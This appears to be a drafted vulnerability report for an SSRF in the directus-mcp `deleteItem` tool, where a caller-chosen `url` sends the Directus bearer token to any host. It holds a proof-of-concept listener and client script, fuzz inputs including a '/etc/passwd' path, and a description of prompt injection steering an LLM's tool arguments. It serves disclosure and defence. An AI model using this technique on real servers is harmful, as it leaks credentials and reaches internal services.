# SSRF in `deleteItem`: caller-supplied `url` sends the Directus bearer token to any host

**Repository:** `pixelsock/directus-mcp` · **Tool:** `deleteItem` · **Tested commit:** `a1ccda3`
**Weakness:** CWE-918 Server-Side Request Forgery (SSRF)

## Summary
`deleteItem` deletes an item from a Directus collection. It accepts an optional `url` argument that overrides the configured Directus base URL. The request is sent with the configured `DIRECTUS_ACCESS_TOKEN` in an `Authorization: Bearer` header. Nothing checks the host, so a caller can send the request, and the token, to any destination the server can reach.

## Details
The base URL comes straight from the tool argument (`index.ts:530`):

```ts
const url = toolArgs.url || CONFIG.DIRECTUS_URL;
```

`deleteItem` builds the request from that value and attaches the token (`index.ts:681-689`):

```ts
case "deleteItem": {
  const token = toolArgs.token || CONFIG.DIRECTUS_ACCESS_TOKEN;
  const collection = toolArgs.collection as string;
  const id = toolArgs.id as string | number;
  await axios.delete(
    `${url}/items/${collection}/${id}`,
    { headers: buildHeaders(token) }
  );
```

`buildHeaders` (`index.ts:71-76`) always sets `Authorization: Bearer ${token}`. No code confirms that `url` points at the operator's Directus instance.

## Steps to reproduce
1. Prerequisites: Node.js and npm. A `DIRECTUS_ACCESS_TOKEN` set in the environment.
2. Start a local listener in a separate terminal:
   ```sh
   python3 -m http.server 8099 --bind 127.0.0.1
   ```
3. Start the server as the README describes:
   ```json
   { "command": "npx", "args": ["-y", "@pixelsock/directus-mcp@latest"],
     "env": { "DIRECTUS_URL": "https://directus.example.com", "DIRECTUS_ACCESS_TOKEN": "<token>" } }
   ```
4. Call the tool with `url` pointing at the listener. Arguments as JSON:
   ```json
   {"url": "http://127.0.0.1:8099/tofu-poc", "collection": "users", "id": "1"}
   ```
   ```python
   import asyncio
   from mcp import ClientSession, StdioServerParameters
   from mcp.client.stdio import stdio_client

   async def main():
       server = StdioServerParameters(command="npx", args=["-y", "@pixelsock/directus-mcp@latest"])
       async with stdio_client(server) as (read, write):
           async with ClientSession(read, write) as session:
               await session.initialize()
               result = await session.call_tool("deleteItem", {"url": "http://127.0.0.1:8099/tofu-poc", "collection": "users", "id": "1"})
               print(result)

   asyncio.run(main())
   ```
5. The listener's log shows the request line `DELETE /tofu-poc/items/users/1`. `http.server` answers DELETE with 501 but still logs it. The default log does not print headers. The `Authorization` header is set by `buildHeaders`, as shown above.

## Expected behavior
The tool should only talk to the configured Directus instance, or to an explicit allowlist. It should not send the configured credentials to other hosts.

## Actual behavior
The request goes to whatever host the caller names, with the bearer token attached. In the fuzz logs, calls with a caller-supplied `url` came back as TCP connection errors from the target address, not as validation errors. The server had attempted the connection.

## Impact
In MCP, the LLM chooses the tool arguments, and prompt injection in content the model reads can steer them. An attacker who controls `url` can make the server send requests to hosts it can reach but the attacker cannot, such as services inside the deployment network. The attacker can also capture the configured Directus access token by naming a host they control. This tool sends DELETE requests.

## Suggested fix
Drop the per-call `url` override, or restrict it: accept only the configured Directus origin (or an explicit allowlist), and after DNS resolution block private, loopback, and link-local addresses. Never attach the configured bearer token to a request whose host has not been validated.

## Status on the default branch
Still present at `a1ccda3` (2026-04-20). The tested commit is the current `refs/remotes/origin/latest` head.

## Prior reports
- #13 "Server-Side Request Forgery Vulnerability in directus-mcp" (issue, open 2026-04-18): CVE-style report. Its main finding is `uploadFile`'s `fileUrl`, but section 7 also lists the per-request `url` override (`index.ts:522` at commit `7775862`) as a "related untrusted target selection", with `/auth/login` as the example sink. Same root cause as this report; the tool-specific flow and the bearer-token leak are not described. No fix linked.
- #14 "fix: patch SSRF vulnerability and upgrade vulnerable dependencies" (PR, open 2026-04-20): adds a `validateUrl` guard (scheme check, DNS resolution, private and loopback address blocking) at the `fileUrl` sink and the per-request `url` override, noting that "any tool could override the Directus API `url` per-request". Would block internal targets once merged, but not merged; it would still let a public attacker-controlled host receive the token.
- #19 "Add Streamable HTTP transport support + fix inspector security vulnerabilities" (PR, merged/closed 2026-04-20): merge commit `a1ccda3` is the tested head. Bumps axios and other dependencies and adds an HTTP transport; it does not touch the `url` override, so it does not fix this.
- Documentation: README.md lists the tools but never mentions the per-call `url` argument or any restriction on it. There is no SECURITY.md or docs/ directory.

<details>
<summary>Internal notes (remove before filing)</summary>

- DUPLICATE/FIXED CHECK: root cause already reported in open issue #13 (it names the per-request `url` override as a related flow) and addressed by open, unmerged PR #14. Not fixed on the default branch. File as a comment on #13, or as one combined issue that references #13 and #14.
- ToFu class / sanitizers: ssrf (CWE-918). Triggered `check_url_structure_and_parsing`, `check_url_hostname_canonicalization`, `check_url_ssrf_ip_ranges`.
- Campaigns and executions: corpus-sbx (1536 exec / 1534 ok), e2-0922 (1/1).
- Evidence (verbatim, trimmed):
  - input `{'url': 'http://127.0.0.1:8500', 'token': 'testtoken', 'collection': 'users', 'id': '1'}` → `Error: connect ECONNREFUSED 127.0.0.1:8500` (the server made the connection attempt).
  - input `{'url': '', ...}` → `Request failed with status code 405` (fell back to the configured URL).
  - input `{'url': '/etc/passwd\x00', ...}` → `Invalid URL`.
- Hand-check hints: REAL. `url` is a documented override argument with no host check, and `buildHeaders` attaches the configured token to any host, so this SSRF also leaks the credential. The ECONNREFUSED result shows the request is really attempted. It shares one root cause with getItems, getCurrentUser, getRoles, getPermissions, getFiles and login; consider one combined issue. The listener reproduction is derived from the code and was not run (READ ONLY). Expected request path: `/tofu-poc/items/users/1`.
</details>
